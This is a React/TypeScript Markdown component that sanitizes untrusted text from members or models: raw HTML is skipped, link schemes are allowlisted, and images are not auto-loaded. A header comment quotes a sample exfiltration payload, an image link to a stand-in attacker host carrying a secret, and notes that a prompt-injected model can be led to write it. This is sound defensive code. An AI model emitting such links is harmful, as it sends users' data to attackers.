"use client"

import { ImageIcon } from "lucide-react"
import * as React from "react"
import ReactMarkdown, { type Components, type Options } from "react-markdown"
import remarkGfm from "remark-gfm"

import { cn } from "@/lib/utils"

// Text that a member or a model wrote, rendered as Markdown: bold, italics,
// links (bare URLs too), lists, quotes, code and GFM tables. It is safe for
// text nobody checked:
// - raw HTML is never rendered (skipHtml; no rehype-raw);
// - links keep only http, https, mailto and same-site paths;
// - images do not load by themselves, since a model can be tricked into
//   writing ![](https://attacker/?d=secret): each one is a link to click.
// Headings stay body size; the page around it owns the title.

const SAFE_URL = /^(https?:|mailto:|\/(?!\/)|#)/i

/** Drops any link whose scheme is not on the safe list. */
function safeUrl(url: string) {
  const trimmed = url.trim()
  return SAFE_URL.test(trimmed) ? trimmed : ""
}

type Props = React.HTMLAttributes<HTMLElement> & { node?: unknown }

/** An element with our classes; react-markdown's `node` prop stays off the DOM. */
function styled(Tag: React.ElementType, classes: string) {
  function Element({ className, ...props }: Props) {
    const rest = { ...props }
    delete rest.node
    return <Tag className={cn(classes, className)} {...rest} />
  }
  return Element
}

function Link({
  className,
  href,
  ...props
}: React.AnchorHTMLAttributes<HTMLAnchorElement> & { node?: unknown }) {
  const rest = { ...props }
  delete rest.node
  if (!href) return <span {...rest} />
  const local = href.startsWith("/") || href.startsWith("#")
  return (
    <a
      href={href}
      target={local ? undefined : "_blank"}
      rel="noreferrer"
      className={cn(
        "break-words text-primary underline underline-offset-4 hover:decoration-2",
        className
      )}
      {...rest}
    />
  )
}

function Image({
  src,
  alt,
}: React.ImgHTMLAttributes<HTMLImageElement> & { node?: unknown }) {
  const url = typeof src === "string" ? safeUrl(src) : ""
  const label = alt || "圖片"
  if (!url) return <span>{label}</span>
  return (
    <a
      href={url}
      target="_blank"
      rel="noreferrer"
      className="inline-flex items-center gap-1 text-primary underline underline-offset-4 hover:decoration-2 [&_svg]:size-4"
    >
      <ImageIcon aria-hidden />
      {label}
    </a>
  )
}

function Table({ className, ...props }: Props) {
  const rest = { ...props }
  delete rest.node
  return (
    <div className="overflow-x-auto">
      <table
        className={cn("w-full border-collapse text-left", className)}
        {...rest}
      />
    </div>
  )
}

const base: Components = {
  h1: styled("h3", "font-semibold"),
  h2: styled("h3", "font-semibold"),
  h3: styled("h4", "font-semibold"),
  h4: styled("h5", "font-medium"),
  h5: styled("h6", "font-medium"),
  h6: styled("h6", "font-medium"),
  a: Link,
  img: Image,
  ul: styled(
    "ul",
    "flex list-disc flex-col gap-1 pl-5 marker:text-muted-foreground"
  ),
  ol: styled(
    "ol",
    "flex list-decimal flex-col gap-1 pl-5 marker:text-muted-foreground"
  ),
  blockquote: styled(
    "blockquote",
    "border-l-2 border-border pl-4 text-muted-foreground"
  ),
  code: styled(
    "code",
    "bg-muted px-1 font-mono [pre_&]:bg-transparent [pre_&]:p-0"
  ),
  pre: styled(
    "pre",
    "overflow-x-auto rounded-control bg-muted p-4 font-mono leading-6"
  ),
  table: Table,
  th: styled(
    "th",
    "border-b border-border px-3 py-2 font-medium text-muted-foreground"
  ),
  td: styled("td", "border-b border-border px-3 py-2"),
  hr: styled("hr", "border-border"),
}

const InlineParagraph = styled("span", "")

function Markdown({
  children,
  className,
  components,
  remarkPlugins,
  inline = false,
}: {
  /** The Markdown source. */
  children: string
  className?: string
  /** Overrides for single elements, merged over the defaults. */
  components?: Components
  /**
   * Extra remark plugins after GFM, for app tokens such as @mentions: a
   * plugin can turn text into a node with `data.hName` and `data.hProperties`.
   */
  remarkPlugins?: Options["remarkPlugins"]
  /** One line of text, such as a list item: paragraphs render as spans. */
  inline?: boolean
}) {
  const merged = React.useMemo<Components>(
    () => ({
      ...base,
      ...(inline ? { p: InlineParagraph } : {}),
      ...components,
    }),
    [components, inline]
  )
  const plugins = React.useMemo(
    () => [remarkGfm, ...(remarkPlugins ?? [])],
    [remarkPlugins]
  )
  const Root = inline ? "span" : "div"
  return (
    <Root
      data-slot="markdown"
      className={cn(
        "min-w-0 break-words",
        !inline && "flex flex-col gap-3 leading-7",
        className
      )}
    >
      <ReactMarkdown
        remarkPlugins={plugins}
        components={merged}
        urlTransform={safeUrl}
        skipHtml
      >
        {children}
      </ReactMarkdown>
    </Root>
  )
}

export { Markdown }
